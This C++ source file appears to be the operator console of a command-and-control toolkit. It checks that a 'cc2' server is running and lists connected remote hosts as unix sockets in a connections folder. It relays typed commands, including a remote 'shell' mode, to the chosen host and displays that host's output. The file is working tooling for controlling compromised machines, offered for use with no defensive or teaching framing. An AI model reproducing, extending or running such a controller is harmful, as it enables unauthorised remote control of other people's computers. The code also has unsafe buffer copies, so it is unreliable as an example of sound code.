#include <unistd.h>
#include <iostream>
#include <sys/un.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <dirent.h>
#include <vector>
#include <mutex>
#include <thread>
#include <sys/inotify.h>
#include <algorithm>
#include <readline/readline.h>
#include <readline/history.h>
#include <signal.h>

// GLOBAL VARIABLES

bool TARGETS_SELECTED = false;
const char CLEAR_SCREEN [] = "\033[2J\033[1;1H";
const char RED_COLOR_START [] = "\033[1;31m";
const char COLOR_END [] = "\033[0m";
int fd; // file descriptor of actual connection
bool IS_SHELL_SESSION_ACTIVE = false;
std::string ACTUAL_CONNECTION;

pid_t proc_find(const char* name) 
{
    DIR* dir;
    struct dirent* ent;
    char* endptr;
    char buf[512];

    if (!(dir = opendir("/proc"))) 
    {
        perror("can't open /proc");
        return -1;
    }
    while((ent = readdir(dir)) != NULL) 
    {
        /* if endptr is not a null character, the directory is not
         * entirely numeric, so ignore it */
        long lpid = strtol(ent->d_name, &endptr, 10);
        if (*endptr != '\0') 
        {
            continue;
        }

        /* try to open the cmdline file */
        snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
        FILE* fp = fopen(buf, "r");

        if (fp) 
        {
            if (fgets(buf, sizeof(buf), fp) != NULL) 
            {
                /* check the first token in the file, the program name */
                char* first = strtok(buf, " ");
                if (!strcmp(first, name)) 
                {
                    fclose(fp);
                    closedir(dir);
                    return (pid_t)lpid;
                }
            }
            fclose(fp);
        }
    }
  	closedir(dir);
    return -1;
}
void updateHosts (std::vector <std::string> & connections)
{
	DIR *d;
    struct dirent *dir;
    d = opendir("./connections");
    if (d)
    {
    	int it = 0;
       	 while ((dir = readdir(d)) != NULL)
       	{
       		if (strcmp(dir->d_name,".") != 0 && strcmp(dir->d_name,"..") != 0)
       		{
       			std::string tmp (dir->d_name);
            	connections.push_back(tmp);
            	it++;
            }
        }
        closedir(d);
    }
}
void printHosts (const std::vector<std::string> & connections)
{
	int i = 0;
	for (const auto & it : connections)
	{
		std::cout << "\033[22;36m[" << i << "]\033[0m " << it << std::endl;
		i++;
	}
}
void notifyAboutNewConnectionsWhenDisconnected (bool connectionsAvailable, std::vector<std::string> & connections)
{
	int inotfd = inotify_init();
	int watch_desc = inotify_add_watch(inotfd, "./connections", IN_CREATE | IN_DELETE);
	size_t bufsiz = sizeof(inotify_event) + PATH_MAX + 1;
	inotify_event * event = (inotify_event *) malloc(bufsiz);
	while (!TARGETS_SELECTED)
	{
		read(inotfd, event, bufsiz);
		if (!connectionsAvailable)
		{
			break;
		}
		connections.clear();
		updateHosts (connections);
		if (connections.size() == 0)
		{
			std::cout << CLEAR_SCREEN;
			std::cout << RED_COLOR_START << "[*] NO CONNECTIONS YET" << COLOR_END << std::endl;
			continue;
		}
		std::cout << CLEAR_SCREEN;
		std::cout << "\n\033[22;36m[*] Please select active connection: \033[0m" << std::endl;
		printHosts (connections);
	}
}
bool checkCommand (const char * command, const char * toCheck)
{
	return !strcmp (command,toCheck);
}

// FORWARD DECLARATION
void commandEntered (char *);

void setReadlineWhenShell ()
{
	rl_callback_handler_remove ();
    rl_callback_handler_install ("", &commandEntered);
}
void setReadlineCommands ()
{
	char * prompt = new char [0x64];
    sprintf (prompt, "\033[22;36m[%s]\033[0m > ",ACTUAL_CONNECTION.c_str());
    rl_callback_handler_remove ();
    rl_callback_handler_install (prompt, &commandEntered);	
    //delete [] prompt;
}

void specialShellBehavior (const char * command)
{
	if (checkCommand (command,"shell"))
    {
    	setReadlineWhenShell();	
    	IS_SHELL_SESSION_ACTIVE = true;
    }
    if (checkCommand (command,"exit") && IS_SHELL_SESSION_ACTIVE)
    {
    	setReadlineCommands ();
    	IS_SHELL_SESSION_ACTIVE = false;
    }	
}
void commandEntered (char * command)
{
	if (command == NULL) 
	{
        return;
    }

    specialShellBehavior (command);

	if (write (fd,command,strlen(command)) == -1)
	{
		perror ("cannot send data to unix socket");
	}
	if (write (fd,"\n",1) == -1) // dirty hack
	{
		perror ("cannot send data to unix socket");
	}
	if(strlen(command) > 0)
	{
		add_history(command);
	}
	free (command);

}
void sigintHandler (int sig)
{
	if (IS_SHELL_SESSION_ACTIVE && TARGETS_SELECTED)
	{
		if (write (fd,"exit\n",5) == -1)
		{
			perror ("cannot send data to unix socket");
		}
		std::cout << "\n[*] Exiting shell session..." << std::endl;
		IS_SHELL_SESSION_ACTIVE = false;
		setReadlineCommands();
	}
	else if (TARGETS_SELECTED)
	{
		std::cout << "\nDisconnecting with actual host..." << std::endl;
		rl_callback_handler_remove ();
		close (fd);
		TARGETS_SELECTED = false;
	}
	else
	{
		rl_callback_handler_remove ();
		exit (0);
	}
}
int main (int argc,char ** argv)
{
	while (1)
	{
		if ( (proc_find("/home/pi/Daemons/cc2") == -1 ) && ( proc_find("./cc2") == -1 ) ) // ran automatically or manually
		{
			std::cout << "\033[22;36m[!]\033[0m" << " cc server is not running, exiting..." << std::endl;
			return -1;
 		}
		std::vector <std::string> connections;
		int selected {};

		signal(SIGINT, sigintHandler); // register sigint signal to be handled 

		updateHosts (connections);
		std::thread inotifyThread;

		if (connections.size() == 0) // no hosts yet
		{
			std::cout << CLEAR_SCREEN;
			std::cout << RED_COLOR_START << "[*] NO CONNECTIONS YET" << COLOR_END << std::endl;
			notifyAboutNewConnectionsWhenDisconnected (0, connections);	 
		}
		else  // hosts available to connect
		{
			update:
			std::cout << CLEAR_SCREEN;
			std::cout << "\n\033[22;36m[*] Please select active connection: \033[0m" << std::endl;
			printHosts (connections);

			std::thread inotifyThread (notifyAboutNewConnectionsWhenDisconnected,1, std::ref(connections) );
			inotifyThread.detach ();

    		std::cin >> selected;
    		if (std::cin.good())
    		{
    			TARGETS_SELECTED = true;
    		}
    		else
    		{
    			if (std::cin.eof())
    			{
    				return 0;
    			}
    			std::cin.clear();
				std::cin.ignore();
				goto update; // hack for malformed input
    		}
    	}
		while (TARGETS_SELECTED)
		{	
			fd_set readfds;
			char buf [0xffff];
		
			struct sockaddr_un addr;
		
	 		if ((fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1)
		 	{
		 		perror("socket error");
		 		exit (-1);
		 	}
		
	 		memset (&addr, 0, sizeof(addr));
		 	addr.sun_family = AF_UNIX;
		 	char filepath [100] {0};
			strcpy (filepath,"./connections/");

			strcpy (filepath+14,connections[selected].c_str());
		 	strncpy(addr.sun_path, filepath, sizeof(addr.sun_path)-1);

	 		if (connect(fd, (struct sockaddr*) &addr, sizeof(addr)) == -1)
		 	{
 		 		perror ("connect error");
		 		exit (-1);
		 	}
		 	ACTUAL_CONNECTION = std::string (connections[selected]);
		 	std::cout << "[*] Connected with " << ACTUAL_CONNECTION << std::endl;

		 	setReadlineCommands ();

			while (1)
			{
				FD_ZERO(&readfds);
				FD_SET(fd, &readfds);
				FD_SET(0, &readfds);
				int bytesToRead;	
				int ret = select(FD_SETSIZE, &readfds, NULL, NULL, NULL); // select unix socket or stdin to read from
				if (ret > 0)
				{
					if (FD_ISSET(fd, &readfds)) // GET DATA FROM REMOTE HOST
					{
						printf("\x1B[u"); // Restore cursor to before the prompt
						printf("\x1B[J\n"); // Erase readline prompt and input (down to bottom of screen)
						int r = read (fd,buf,0xffff);
						if (r > 0)
						{
							int s = strlen(buf);
							for (int i = 0 ; i < s; i++)
							{
								if (buf[i] == '\xa0') // windows hack
								{
									buf[i] = '\x20';
								}
							}
							std::cout << buf << std::flush;
						}
						else if (r == -1)
						{
							ACTUAL_CONNECTION = "";
							perror ("cannot read from unix socket");
							break;	
						}
						else if (r == 0)
						{
							std::cout << "[!] Connection closed by remote host or server is down" << std::endl;
							ACTUAL_CONNECTION = "";
							TARGETS_SELECTED = false;
							rl_callback_handler_remove ();
							close (fd);
							break;
						}
						printf("\x1B[s"); // Save new cursor position
						rl_forced_update_display(); // Restore readline
						memset (buf,0,0xffff);
					}
					else if (FD_ISSET(0, &readfds)) // SEND DATA TO REMOTE HOST
					{
						printf("\x1B[s");
						rl_callback_read_char();
					}
				}
				else if (ret < 0)
				{
					if (!TARGETS_SELECTED) // back to choosing host
					{
						break;
					}
					// error handling for select errror
				}
			}
		}
	}
	
	return 0;
}
